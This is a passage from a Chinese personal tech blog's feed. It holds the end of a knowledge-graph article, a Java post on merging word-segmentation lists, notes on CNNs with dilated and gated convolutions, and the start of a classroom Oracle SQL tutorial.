)。这些翻译过的图查询被进一步提交给图数据库进行回答返回相应的答案。</p><h1>总结</h1><p>这篇文章比较系统地介绍了知识图谱的表示、构建、挖掘以及在搜索中的应用。通过上述介绍，大家可以看出：</p><ol>  <li>目前知识图谱还处于初期阶段;</li>  <li>人工干预很重要;</li>  <li>结构化数据在知识图谱的构建中起到决定性作用;</li>  <li>各大搜索引擎公司为了保证知识图谱的质量多半采用成熟的算法;</li>  <li>知识卡片的给出相对比较谨慎;</li>  <li>更复杂的自然语言查询将崭露头角(如Google的蜂鸟算法)。</li></ol><p>此外，知识图谱的构建是多学科的结合，需要知识库、自然语言理解，机器学习和数据挖掘等多方面知识的融合。有很多开放性问题需要学术界和业界一起解决。我们有理由相信学术界在上述方面的突破将会极大地促进知识图谱的发展。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/349dc05d/">http://home.meng.uno/articles/349dc05d/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      简介
近两年来，随着Linking Open Data等项目的全面展开，语义Web数据源的数量激增，大量RDF数据被发布。互联网正从仅包含网页和网页之间超链接的文档万维网(Document Web)转变成包含大量描述各种实体和实体之间丰富关系的数据万维网(Data Web)。在这个背景下，Google、百度和搜狗等搜索引擎公司纷纷以此为基础构建知识图谱，分别为Knowledge Graph、知心和知立方，来改进搜索质量，从而拉开了语义搜索的序幕。下面我将从以下几个方面来介绍知识图谱：知识图谱的表示和在搜索中的展现形式，知识图谱的构建和知识图谱在搜索中的应用等，从而让大家有机会了解其内部的技术实
    
    </summary>
    
      <category term="Natural Language Processing" scheme="http://home.meng.uno/categories/Natural-Language-Processing/"/>
    
    
      <category term="知识图谱" scheme="http://home.meng.uno/tags/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/"/>
    
      <category term="Knowledge Graph" scheme="http://home.meng.uno/tags/Knowledge-Graph/"/>
    
  </entry>
  
  <entry>
    <title>Java合并List</title>
    <link href="http://home.meng.uno/articles/66999e7d/"/>
    <id>http://home.meng.uno/articles/66999e7d/</id>
    <published>2018-07-15T02:15:54.000Z</published>
    <updated>2020-12-02T01:42:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1>问题</h1><p>在写我的毕业设计时，遇到了这样两个问题：</p><ol>  <li>给定一个分词结果（List    <string>）与一个知道偏置的专有名词（特定领域命名实体）的结果（List      <stirng>），怎么将两者融合成一个统一的分词结果（List        <string>）。</string></stirng></string></li>  <li>给定一个分词结果（List    <string>）与一条规则（人为规定的分词结果（List      <string>）），怎么将规则整合到分词结果中，得到一个统一的分词结果（List        <string>）。</string></string></string></li></ol><p>虽然在算法上没有多少难度，但是在实现上还是挺费时间思考，所以我将我的实现保存起来，以后没准我还会再用到。</p><h1>方案</h1><h2 id="合并专有名词">合并专有名词</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">segTemp</span><span class="params">(List&lt;String&gt; tmp, List&lt;Term&gt; area, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">  List&lt;String&gt; ret = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">  <span class="keyword">int</span> area_len = area.size();</span><br><span class="line">  <span class="keyword">if</span> (area_len == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> tmp_index = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> tmp_i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tmp.size(); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (index == area.get(tmp_i).getOffe()) &#123;</span><br><span class="line">      ret.add(area.get(tmp_i).getRealName());</span><br><span class="line">      index += area.get(tmp_i).getRealName().length();</span><br><span class="line">      i--;</span><br><span class="line">      <span class="keyword">if</span> (tmp_i &lt; area_len - <span class="number">1</span>) &#123;</span><br><span class="line">        tmp_i++;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &gt; tmp_index) &#123;</span><br><span class="line">      <span class="keyword">if</span> (tmp_index + tmp.get(i).length() &lt;= index)&#123;</span><br><span class="line">        tmp_index += tmp.get(i).length();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ret.add(tmp.get(i).substring(index - tmp_index));</span><br><span class="line">        tmp_index += tmp.get(i).length();</span><br><span class="line">        index = tmp_index;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index + tmp.get(i).length() &lt;= area.get(tmp_i).getOffe()) &#123;</span><br><span class="line">      ret.add(tmp.get(i));</span><br><span class="line">      index += tmp.get(i).length();</span><br><span class="line">      tmp_index += tmp.get(i).length();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index + tmp.get(i).length() &gt; area.get(tmp_i).getOffe()</span><br><span class="line">        &amp;&amp; index &lt; area.get(tmp_i).getOffe()) &#123;</span><br><span class="line">      ret.add(tmp.get(i).substring(<span class="number">0</span>, area.get(tmp_i).getOffe() - index));</span><br><span class="line">      index += area.get(tmp_i).getOffe() - index;</span><br><span class="line">      tmp_index += tmp.get(i).length();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 从上一个位置break</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; tmp.size(); j++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; tmp_index) &#123;</span><br><span class="line">      <span class="keyword">if</span> (tmp_index + tmp.get(j).length() &lt;= index) &#123;</span><br><span class="line">        tmp_index += tmp.get(j).length();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ret.add(tmp.get(j).substring(index - tmp_index));</span><br><span class="line">        tmp_index += tmp.get(j).length();</span><br><span class="line">        index = tmp_index;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ret.add(tmp.get(j));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="合并规则">合并规则</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">match</span><span class="params">(String text, List&lt;String&gt; ori, List&lt;Rule&gt; rule)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(rule.isEmpty())&#123;</span><br><span class="line"><span class="keyword">return</span> ori;</span><br><span class="line">&#125;</span><br><span class="line">List&lt;String&gt; ret = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"><span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">for</span>(Rule ru : rule)&#123;</span><br><span class="line">List&lt;Integer&gt; loc = getLocation(text,ru.toString());</span><br><span class="line"><span class="keyword">if</span>(loc.isEmpty())&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">flag = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">int</span> num = loc.size();</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; num;i++)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = loc.get(i);</span><br><span class="line"><span class="keyword">while</span>(idx+ori.get(j).length() &lt; tmp)&#123;</span><br><span class="line">ret.add(ori.get(j));</span><br><span class="line">idx += ori.get(j).length(); </span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ori.get(j).substring(idx+ori.get(j).length() - tmp) != <span class="keyword">null</span> || !ori.get(j).substring(idx+ori.get(j).length() - tmp).equals(<span class="string">""</span>))&#123;ret.add(ori.get(j).substring(idx+ori.get(j).length() - tmp));</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">ret.addAll(ru.getRule());</span><br><span class="line"><span class="keyword">while</span>(j&lt;ori.size())&#123;</span><br><span class="line"><span class="keyword">if</span>(idx + ori.get(j).length() &lt;= tmp+ru.toString().length())&#123;</span><br><span class="line">idx += ori.get(j).length();</span><br><span class="line">j++;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(idx + ori.get(j).length() &gt; tmp+ru.toString().length() &amp;&amp; idx &lt; tmp + ru.toString().length())&#123;</span><br><span class="line">idx += ori.get(j).length();</span><br><span class="line">ret.add(ori.get(j).substring(idx - (tmp + ru.toString().length() )));</span><br><span class="line">j++;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j&lt;ori.size())&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> t = j;t &lt; ori.size();t++)&#123;</span><br><span class="line">ret.add(ori.get(t));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ori = ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ori;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/66999e7d/">http://home.meng.uno/articles/66999e7d/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      问题
在写我的毕业设计时，遇到了这样两个问题：

 1. 给定一个分词结果（List ）与一个知道偏置的专有名词（特定领域命名实体）的结果（List ），怎么将两者融合成一个统一的分词结果（List ）。
 2. 给定一个分词结果（List ）与一条规则（人为规定的分词结果（List ）），怎么将规则整合到分词结果中，得到一个统一的分词结果（List ）。

虽然在算法上没有多少难度，但是在实现上还是挺费时间思考，所以我将我的实现保存起来，以后没准我还会再用到。

方案
合并专有名词
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
2
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="Java" scheme="http://home.meng.uno/tags/Java/"/>
    
      <category term="List" scheme="http://home.meng.uno/tags/List/"/>
    
  </entry>
  
  <entry>
    <title>CNN</title>
    <link href="http://home.meng.uno/articles/7203e497/"/>
    <id>http://home.meng.uno/articles/7203e497/</id>
    <published>2018-07-04T04:09:21.000Z</published>
    <updated>2020-12-02T01:42:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1>为什么使用 CNN 代替 RNN</h1><blockquote>  <p><a href="https://www.jiqizhixin.com/articles/041503" target="_blank" rel="noopener">关于序列建模，是时候抛弃RNN和LSTM了</a> | 机器之心 <a href="https://towardsdatascience.com/the-fall-of-rnn-lstm-2d1594c74ce0" target="_blank" rel="noopener">[英文原文]</a></p></blockquote><p><strong>RNN/LSTM 本身的问题(3)</strong></p><ol>  <li>    <p>RNN 需要更多的资源来训练，它和 硬件加速不匹配</p>    <blockquote>      <p>训练 RNN 和 LSTM 非常困难，因为计算能力受到内存和带宽等的约束。简单来说，每个 LSTM 单元需要四个仿射变换，且每一个时间步都需要运行一次，这样的仿射变换会要求非常多的内存带宽。<strong>添加更多的计算单元很容易，但添加更多的内存带宽却很难</strong>——这与目前的硬件加速技术不匹配，一个可能的解决方案就是让计算在存储器设备中完成。</p>    </blockquote>  </li>  <li>    <p>RNN 容易发生<strong>梯度消失</strong>，即使是 LSTM</p>    <blockquote>      <p>在长期信息访问当前处理单元之前，需要按顺序地通过所有之前的单元。这意味着它很容易遭遇梯度消失问题；LSTM 一定程度上解决了这个问题，但 LSTM 网络中依然存在顺序访问的序列路径——直观来说，LSTM 能跳过一段信息中不太重要的部分，但如果整段信息都很重要，它依然需要完整的顺序访问，此时就跟 RNN 没有区别了。</p>    </blockquote>  </li>  <li>    <p><strong>注意力机制模块</strong>（记忆模块）的应用</p>    <ul>      <li>注意力机制模块可以同时<strong>前向预测</strong>和<strong>后向回顾</strong>。</li>      <li><strong>分层注意力编码器</strong>（Hierarchical attention encoder）</li>    </ul>    <div align="center"><img src="http://www.meng.uno/images/assets/TIM截图20180720101423.png" height="250"></div>    - 分层注意力模块通过一个**层次结构**将过去编码向量**汇总**到一个**上下文向量**`C_t` ——这是一种更好的**观察过去信息**的方式（观点） - **分层结构**可以看做是一棵**树**，其路径长度为 `logN`，而 RNN/LSTM 则相当于一个**链表**，其路径长度为 `N`，如果序列足够长，那么可能 `N >> logN` > [放弃 RNN/LSTM 吧，因为真的不好用！望周知~](https://blog.csdn.net/heyc861221/article/details/80174475)    - CSDN博客  </li></ol><p><strong>任务角度</strong></p><p>从任务本身考虑，我认为也是 CNN 更有利，LSTM 因为能记忆比较长的信息，所以在推断方面有不错的表现（直觉）；但是在事实类问答中，并不需要复杂的推断，答案往往藏在一个 <strong>n-gram 短语</strong>中，而 CNN 能很好的对 n-gram 建模。</p><h1>常见的卷积结构</h1><blockquote>  <p><a href="https://zhuanlan.zhihu.com/p/28186857" target="_blank" rel="noopener">一文了解各种卷积结构原理及优劣</a> - 知乎 &amp; vdumoulin/    <a href="https://github.com/vdumoulin/conv_arithmetic" target="_blank" rel="noopener">conv_arithmetic</a> - GitHUub</p></blockquote><h2 id="基本卷积">基本卷积</h2><table style="width:100%; table-layout:fixed;">  <tr>    <td>No padding, no strides</td>    <td>Arbitrary padding, no strides</td>    <td>Half padding, no strides</td>    <td>Full padding, no strides</td>  </tr>  <tr>    <td><img width="150px" src="http://www.meng.uno/images/assets/no_padding_no_strides.gif"></td>    <td><img width="150px" src="http://www.meng.uno/images/assets/arbitrary_padding_no_strides.gif"></td>    <td><img width="150px" src="http://www.meng.uno/images/assets/same_padding_no_strides.gif"></td>    <td><img width="150px" src="http://www.meng.uno/images/assets/full_padding_no_strides.gif"></td>  </tr>  <tr>    <td>No padding, strides</td>    <td>Padding, strides</td>    <td>Padding, strides (odd)</td>  </tr>  <tr>    <td><img width="150px" src="http://www.meng.uno/images/assets/no_padding_strides.gif"></td>    <td><img width="150px" src="http://www.meng.uno/images/assets/padding_strides.gif"></td>    <td><img width="150px" src="http://www.meng.uno/images/assets/padding_strides_odd.gif"></td>  </tr></table><!-- TODO: 更细的分类 --><h2 id="转置卷积">转置卷积</h2><ul>  <li>转置卷积（Transposed Convolution），又称反卷积（Deconvolution）、Fractionally Strided Convolution    <blockquote>      <p>反卷积的说法不够准确，数学上有定义真正的反卷积，两者的操作是不同的</p>    </blockquote>  </li>  <li>转置卷积是卷积的<strong>逆过程</strong>，如果把基本的卷积（+池化）看做“缩小分辨率”的过程，那么转置卷积就是“<strong>扩充分辨率</strong>”的过程。    <ul>      <li>为了实现扩充的目的，需要对输入以某种方式进行<strong>填充</strong>。</li>    </ul>  </li>  <li>转置卷积与数学上定义的反卷积不同——在数值上，它不能实现卷积操作的逆过程。其内部实际上执行的是常规的卷积操作。    <ul>      <li>转置卷积只是为了<strong>重建</strong>先前的空间分辨率，执行了卷积操作。</li>    </ul>  </li>  <li>虽然转置卷积并不能还原数值，但是用于<strong>编码器-解码器结构</strong>中，效果仍然很好。——这样，转置卷积可以同时实现图像的<strong>粗粒化</strong>和卷积操作，而不是通过两个单独过程来完成。</li></ul><table style="width:100%; table-layout:fixed;">  <tr>    <td>No padding, no strides, transposed</td>    <td>Arbitrary padding, no strides, transposed</td>    <td>Half padding, no strides, transposed</td>    <td>Full padding, no strides, transposed</td>  </tr>  <tr>    <td><img width="150px" src="http://www.meng.uno/images/assets/no_padding_no_strides_transposed.gif"></td>    <td><img width="150px" src="http://www.meng.uno/images/assets/arbitrary_padding_no_strides_transposed.gif"></td>    <td><img width="150px" src="http://www.meng.uno/images/assets/same_padding_no_strides_transposed.gif"></td>    <td><img width="150px" src="http://www.meng.uno/images/assets/full_padding_no_strides_transposed.gif"></td>  </tr>  <tr>    <td>No padding, strides, transposed</td>    <td>Padding, strides, transposed</td>    <td>Padding, strides, transposed (odd)</td>  </tr>  <tr>    <td><img width="150px" src="http://www.meng.uno/images/assets/no_padding_strides_transposed.gif"></td>    <td><img width="150px" src="http://www.meng.uno/images/assets/padding_strides_transposed.gif"></td>    <td><img width="150px" src="http://www.meng.uno/images/assets/padding_strides_odd_transposed.gif"></td>  </tr></table><h2 id="空洞卷积">空洞卷积</h2><ul>  <li>空洞卷积（Atrous Convolutions）也称扩张卷积（Dilated Convolutions）、膨胀卷积。</li>  <li>    <div align="center"><img src="http://www.meng.uno/images/assets/conv_dilation.gif" height="200"><br>No padding, no strides.</div>  </li></ul><p><strong>空洞卷积的作用</strong></p><ul>  <li>    <p>空洞卷积使 CNN 能够<strong>捕捉更远的信息，获得更大的感受野</strong>；同时不增加参数的数量，也不影响训练的速度。</p>  </li>  <li>    <p>示例：Conv1D + 空洞卷积</p>    <div align="center"><img src="http://www.meng.uno/images/assets/普通卷积与膨胀卷积.png" height="200"></div>    <!-- - 普通卷积在第三层时，每个节点只能捕捉到前后3个输入 -->  </li></ul><h2 id="可分离卷积">可分离卷积</h2><ul>  <li>可分离卷积（separable convolution）</li>  <li>TODO</li></ul><h2 id="keras-实现">Keras 实现</h2><ul>  <li>Keras 中通过在卷积层中加入参数 <code>dilation_rate</code>实现    <figure class="highlight python">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>          </td>          <td class="code">            <pre><span class="line">Conv1D(filters=config.filters,</span><br><span class="line">      kernel_size=config.kernel_size,</span><br><span class="line">      dilation_rate=<span class="number">2</span>)</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><!--  TODO: 维度变化 --><h1>门卷积</h1><blockquote>  <p><a href="https://blog.csdn.net/stdcoutzyx/article/details/55004458" target="_blank" rel="noopener">卷积新用之语言模型</a> - CSDN博客</p></blockquote><ul>  <li>    <p>类似 LSTM 的过滤机制，实际上是卷积网络与<strong>门限单元</strong>（Gated Linear Unit）的组合</p>  </li>  <li>    <p>核心公式</p>    <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180720110804.png"></div>    <!-- \boldsymbol{Y}=\text{Conv1D}_{(1)}(\boldsymbol{X}) \otimes \sigma\Big(\text{Conv1D}_{(2)}(\boldsymbol{X})\Big)dsymbol{X})\Big) -->    <blockquote>      <p>中间的运算符表示<strong>逐位相乘</strong>—— Tensorflow 中由 <code>tf.multiply(a, b)</code> 实现，其中 a 和 b 的 shape 要相同；后一个卷积使用<code>sigmoid</code>激活函数</p>    </blockquote>  </li>  <li>    <p>一个门卷积 Block</p>    <div align="center"><img src="http://www.meng.uno/images/assets/门卷积.jpg" height=""></div>    <blockquote>      <p><code>W</code> 和 <code>V</code> 表明参数不共享</p>    </blockquote>  </li>  <li>    <p>实践中，为了防止梯度消失，还会在每个 Block 中加入残差</p>  </li></ul><h2 id="门卷积的作用">门卷积的作用</h2><ul>  <li>减缓梯度消失</li>  <li>解决语言顺序依存问题（？ TODO）</li></ul><h2 id="门卷积是如何防止梯度消失的">门卷积是如何防止梯度消失的</h2><ul>  <li>    <p>因为公式中有一个卷积没有经过激活函数，所以对这部分求导是个常数，所以梯度消失的概率很小。</p>  </li>  <li>    <p>如果还是担心梯度消失，还可以加入<strong>残差</strong>——要求输入输出的 shape 一致</p>    <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180720113735.png"></div>    <!-- \boldsymbol{Y}={\color{Red} \boldsymbol{X} \,+\;} \text{Conv1D}_{(1)}(\boldsymbol{X}) \otimes \sigma\Big(\text{Conv1D}_{(2)}(\boldsymbol{X})\Big) -->    <p>更直观的理解：</p>    <div align="center"><img src="http://www.meng.uno/images/assets/公式_20180720120400.png"></div>    <!-- \begin{aligned}\boldsymbol{Y}=&\,\boldsymbol{X} + {\color{Red}\text{Conv1D}_{(1)}(\boldsymbol{X})}\otimes \sigma\Big(\text{Conv1D}_{(2)}(\boldsymbol{X})\Big)\\=&\,\boldsymbol{X} + {\color{Red}\Big(\text{Conv1D}_{(1)}(\boldsymbol{X}) - \boldsymbol{X}\Big)}\otimes \sigma\Big(\text{Conv1D}_{(2)}(\boldsymbol{X})\Big)\\ =&\,\boldsymbol{X}\otimes \Big[1-\sigma\Big(\text{Conv1D}_{(2)}(\boldsymbol{X})\Big)\Big] + \text{Conv1D}_{(1)}(\boldsymbol{X}) \otimes \sigma\Big(\text{Conv1D}_{(2)}(\boldsymbol{X})\Big)\\ =&\,\boldsymbol{X}\otimes \Big(1-\boldsymbol{\sigma}\Big) + \text{Conv1D}_{(1)}(\boldsymbol{X}) \otimes \boldsymbol{\sigma} \end{aligned} -->    <p>即信息以 <code>1-σ</code> 的概率直接通过，以 <code>σ</code> 的概率经过变换后通过——类似 GRU</p>    <blockquote>      <p>因为<code>Conv1D(X)</code>没有经过激活函数，所以实际上它只是一个线性变化；因此与 <code>Conv1D(X) - X</code> 是等价的</p>      <p><a href="https://kexue.fm/archives/5409#%E9%97%A8%E6%9C%BA%E5%88%B6" target="_blank" rel="noopener">基于CNN的阅读理解式问答模型：DGCNN</a> - 科学空间|Scientific Spaces</p>    </blockquote>  </li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/7203e497/">http://home.meng.uno/articles/7203e497/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      为什么使用 CNN 代替 RNN
关于序列建模，是时候抛弃RNN和LSTM了 | 机器之心 [英文原文]

RNN/LSTM 本身的问题(3)

 1.  RNN 需要更多的资源来训练，它和 硬件加速不匹配
    
    训练 RNN 和 LSTM 非常困难，因为计算能力受到内存和带宽等的约束。简单来说，每个 LSTM 单元需要四个仿射变换，且每一个时间步都需要运行一次，这样的仿射变换会要求非常多的内存带宽。添加更多的计算单元很容易，但添加更多的内存带宽却很难——这与目前的硬件加速技术不匹配，一个可能的解决方案就是让计算在存储器设备中完成。
    
    
 2.  RNN 容易发生梯
    
    </summary>
    
      <category term="Deep Learning" scheme="http://home.meng.uno/categories/Deep-Learning/"/>
    
    
      <category term="CNN" scheme="http://home.meng.uno/tags/CNN/"/>
    
      <category term="深度学习" scheme="http://home.meng.uno/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Oracle教程</title>
    <link href="http://home.meng.uno/articles/33c755f8/"/>
    <id>http://home.meng.uno/articles/33c755f8/</id>
    <published>2018-04-04T06:56:38.000Z</published>
    <updated>2020-12-02T01:59:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1>Oracle第一章</h1><ol>  <li>首先打开Oracle服务</li>  <li>配置监听器（这个是因为教室的电脑Oracle安装有问题，没有配置好监听器）开始菜单中找到<em>net configration assistant</em>添加一个监听器</li>  <li>用system用户登录sqlplus</li>  <li>解锁scott用户 :（也是因为教室的Oracle安装问题导致scott账户未解锁）</li></ol><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">alter user scott account unlock;</span><br></pre>      </td>    </tr>  </table></figure><ol start="5">  <li>修改scott密码:</li></ol><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">alter user scott identified by tiger;</span><br></pre>      </td>    </tr>  </table></figure><ol start="6">  <li>使用scott登录sqlplus, scott是oracle自带的一个实例账户，它带有四个实例表,其中重要的就是<code>emp</code>员工表与<code>dept</code>部门表</li>  <li>安装PL/SQL第三方工具, 因为Oracle没有自带的图形化界面管理器，所以我们需要安装PLSQL，它是oracle的一个第三方GUI工具。</li></ol><p><strong><em>介绍一下Oracle的命令</em></strong></p><ul>  <li>连接数据库：</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">connect scoott/tiger@orcl;</span><br></pre>      </td>    </tr>  </table></figure><p>用户名为scott，密码为tiger,数据库名为orcl</p><ul>  <li>显示当前用户：</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">show user;</span><br></pre>      </td>    </tr>  </table></figure><p>也可使用查询语句：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">select USER from dual; --dual是oracle的一个虚拟表</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>显示表结构(以emp表为例)：</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">describe emp;</span><br></pre>      </td>    </tr>  </table></figure><p>可简写为：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">desc emp;</span><br></pre>      </td>    </tr>  </table></figure><h1>Oracle第二章</h1><h2 id="创建表空间">创建表空间</h2><p>（在SqlServer中称为创建一个是数据库，而在Oracle中则称为创建一个表空间）</p><p><em>格式： create tablespace 表空间名 datafile ‘文件路径’ size 文件大小</em></p><p>如：</p><pre><code>cerate tablespace myspace datafile 'D:\myspace.dbf' size 10MB;</code></pre><p>删除表空间：</p><pre><code>drop tablespace myspace incluiding contents and datafile;</code></pre><h2 id="创建用户">创建用户</h2><p><em>格式： create user 用户名 identified by 密码 default tablespace 默认表空间</em></p><p>如：</p><pre><code>create user user1 identified by user1 default tablespace system;</code></pre><p><strong>删除用户：</strong></p><pre><code>drop user user1 cascade;</code></pre><h2 id="给用户授权">给用户授权</h2><p><em>方式一：授予角色</em></p><pre><code>1、connect     //登录2、resource    //普通权限，用于操作3、DBA         //管理员权限（慎用）</code></pre><p>如：</p><pre><code>grant connect to user1;grant connect,resource to user1;</code></pre><p><em>方式二：授予单个权限</em></p><p>如：</p><pre><code>grant create table to user1;           //授予user1建表的权限grant drop table to user1;             //授予user1删表的权限</code></pre><p><em>方式三：将某个对象的权限授予用户</em></p><p>如：</p><pre><code>grant select on scott.emp to user1;      //将scott用户的emp表的查询权限授予user1grant all on scott.emp to user1;       //将scott用户的emp表的所有权限授予user1 </code></pre><p><strong>收回权限：</strong></p><p><em>格式： revoke 权限 from 用户</em></p><p>如：</p><pre><code>revoke connect from user1;   //收回user1的connect权限revoke select on scott.emp from user1;    //收回user1对emp表的查询权限  </code></pre><h1>Oracle第三章</h1><h2 id="基本查询">基本查询</h2><p><em>select格式：</em></p><figure 